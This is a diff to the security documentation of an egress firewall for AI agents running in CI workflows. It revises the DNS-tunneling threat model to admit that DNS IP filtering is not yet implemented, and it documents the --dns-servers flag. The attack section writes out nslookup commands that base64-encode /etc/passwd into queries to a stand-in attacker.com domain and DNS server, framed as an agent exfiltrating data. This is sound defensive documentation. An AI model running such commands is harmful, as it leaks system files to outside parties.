@@ -22,7 +22,7 @@ This firewall solves a specific problem: **egress control for AI agents running 
 
 - **Full filesystem access**: Agents read and write files freely. If your threat model requires filesystem isolation, you need additional controls.
 - **Localhost communication**: Required for stdio-based MCP servers running alongside the agent.
-- **DNS to trusted servers only**: DNS queries are restricted to configured DNS servers (default: Google DNS). This prevents DNS-based data exfiltration to attacker-controlled DNS servers.
+- **DNS resolution**: The `--dns-servers` flag configures which DNS servers the container uses by default, but applications can still query arbitrary DNS servers. See [DNS Configuration](#dns-configuration) for current limitations.
 
 ---
 
@@ -264,21 +264,27 @@ Squid logs the attempt with timestamp, source IP, and full URL. The token never 
 
 ### DNS Tunneling
 
-**Attack:** Agent encodes data in DNS queries to an attacker-controlled DNS server:
+**Attack:** Agent encodes data in DNS queries to exfiltrate via DNS:
 ```bash
+# Method 1: Query data via allowed DNS server to attacker-controlled domain
+nslookup $(cat /etc/passwd | base64).attacker.com
+
+# Method 2: Direct query to attacker's DNS server (if IP filtering were bypassed)
 nslookup $(cat /etc/passwd | base64).attacker.com attacker-dns-server.com
 ```
 
-**Mitigation:** DNS traffic is restricted to trusted DNS servers only (configurable via `--dns-servers`, default: Google DNS 8.8.8.8, 8.8.4.4). Attempts to query arbitrary DNS servers are blocked at the iptables level.
+**Current Mitigation:** The `--dns-servers` flag configures the container's `/etc/resolv.conf`, which prevents Method 1 when applications respect the system resolver. However:
 
-```bash
-# The attacker's query to a rogue DNS server is blocked
-[FW_BLOCKED_UDP] SRC=172.30.0.20 DST=attacker-dns-server.com DPT=53
-```
+:::caution[DNS IP Filtering Not Implemented]
+**Method 2 is not currently blocked.** Applications that bypass `/etc/resolv.conf` and query DNS servers directly (e.g., `dig @1.1.1.1`, custom DNS clients) can reach any DNS server, regardless of the `--dns-servers` setting.
 
-:::note[Remaining risk]
-DNS tunneling through the *allowed* DNS servers (encoding data in query names to attacker-controlled domains) is still theoretically possible, as the trusted DNS server will recursively resolve any domain. For high-security environments, consider using a DNS filtering service or monitoring DNS query logs for anomalies.
+DNS IP-based filtering (blocking UDP/TCP port 53 to non-allowlisted IPs) is tracked in [issue #9](https://github.com/githubnext/gh-aw-firewall/issues/9).
 :::
+
+**Remaining Risk:** Even with IP filtering, DNS tunneling through *allowed* DNS servers (Method 1) remains possible, as trusted DNS servers will recursively resolve any domain. For high-security environments, consider:
+- Using a DNS filtering service that blocks suspicious query patterns
+- Monitoring DNS query logs for anomalies (base64-encoded data, excessive subdomain levels)
+- Restricting allowed domains at the application level
 
 ---
 
@@ -289,6 +295,35 @@ DNS tunneling through the *allowed* DNS servers (encoding data in query names to
 **Non-HTTP protocols are blocked, not filtered.** SSH (port 22), raw TCP, custom protocols—all dropped by iptables. We don't inspect them for allowed destinations. If your agent needs SSH access to specific hosts, you'll need additional rules.
 
 **Single-runner scope.** The firewall protects one workflow job on one runner. It doesn't coordinate across parallel jobs or provide organization-wide policy. Each job configures its own allowlist.
+
+---
+
+## DNS Configuration
+
+The `--dns-servers` flag configures the default DNS servers used by the agent container:
+
+```bash
+sudo awf --allow-domains github.com --dns-servers 1.1.1.1,1.0.0.1 -- your-command
+```
+
+**What this does:**
+- Sets container's `/etc/resolv.conf` to use specified DNS servers
+- Configures Docker's DNS settings for the container
+- Influences DNS resolution for most applications that use the system resolver
+
+**What this does NOT do:**
+- Block DNS queries to non-specified servers at the IP level
+- Prevent applications from bypassing `/etc/resolv.conf` (e.g., `dig @1.1.1.1`)
+- Filter DNS queries by destination IP address
+
+**Security implications:**
+- Applications respecting `/etc/resolv.conf` will only use specified servers
+- Applications with hardcoded DNS servers or custom DNS clients can query any server
+- DNS IP filtering (planned in [#9](https://github.com/githubnext/gh-aw-firewall/issues/9)) will add enforcement at iptables level
+
+**Current defaults:**
+- IPv4: `8.8.8.8, 8.8.4.4` (Google Public DNS)
+- Docker embedded DNS: `127.0.0.11` (always allowed for service name resolution)
 
 ---
 
